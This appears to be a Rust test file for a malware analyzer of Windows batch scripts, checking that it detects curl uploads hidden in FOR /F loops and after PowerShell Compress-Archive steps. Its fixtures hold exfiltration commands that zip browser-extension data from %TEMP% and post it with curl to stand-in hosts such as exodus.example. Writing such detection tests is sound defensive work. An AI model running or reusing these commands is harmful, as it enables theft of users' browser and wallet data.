    #[test]
    fn skipped_for_f_curl_with_known_percent_url_still_surfaces_download() {
        let report = analyze(
            br#"set "uploadUrl=https://exodus.example/files/upload.php"
set "zipFile=%TEMP%\BrowserExtensionSettings.zip"
goto end
for /f "delims=" %%a in ('curl -F "file=@%zipFile%" "%uploadUrl%"') do set "response=%%a"
:end
"#,
            &Config::default(),
        );

        assert!(
            report.traits.iter().any(|t| matches!(
                t,
                Trait::Download { src, dst, .. }
                    if src == "https://exodus.example/files/upload.php" && dst.is_none()
            )),
            "known URL variable in skipped FOR/F curl was not rescued: {:?}\n{}",
            report.traits,
            report.deobfuscated
        );
    }

    #[test]
    fn powershell_compress_archive_destination_allows_later_if_exist_upload() {
        let report = analyze(
            br#"set "uploadUrl=https://exodus.example/files/upload.php"
set "zipFile=%TEMP%\BrowserExtensionSettings.zip"
powershell -command "Compress-Archive -Path '%TEMP%\ArchiveContents\*' -DestinationPath '%zipFile%'"
if exist "%zipFile%" (
    for /f "delims=" %%a in ('curl -F "file=@%zipFile%" "%uploadUrl%"') do set "response=%%a"
)
"#,
            &Config::default(),
        );

        assert!(
            report.traits.iter().any(|t| matches!(
                t,
                Trait::Download { src, dst, .. }
                    if src == "https://exodus.example/files/upload.php" && dst.is_none()
            )),
            "Compress-Archive destination did not make later curl upload branch reachable: {:?}\n{}",
            report.traits,
            report.deobfuscated
        );
    }

    #[test]
    fn quoted_full_path_curl_in_deob_text_emits_structured_download() {
        let mut env = crate::env::Environment::new(&Config::default());
        crate::deob_scan::scan_deob_text(
            r#"powershell -command "c:\windows\system32\curl.exe" https://fullpath-curl.example/check.php?pcn=host:user:"#,
            &mut env,
        );
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, dst, .. }
                    if src == "https://fullpath-curl.example/check.php?pcn=host:user"
                        && dst.is_none()
            )
        });
        assert!(
            has,
            "no structured Download from quoted full-path curl: {:?}",
            env.traits
        );
        let generic_count = env
            .traits
            .iter()
            .filter(|t| {
                matches!(t, Trait::DownloadInDeobText { src, .. } if src.contains("fullpath-curl.example"))
            })
            .count();
        assert_eq!(
            generic_count, 0,
            "full-path curl URL double-emitted: {:?}",
            env.traits
        );
    }

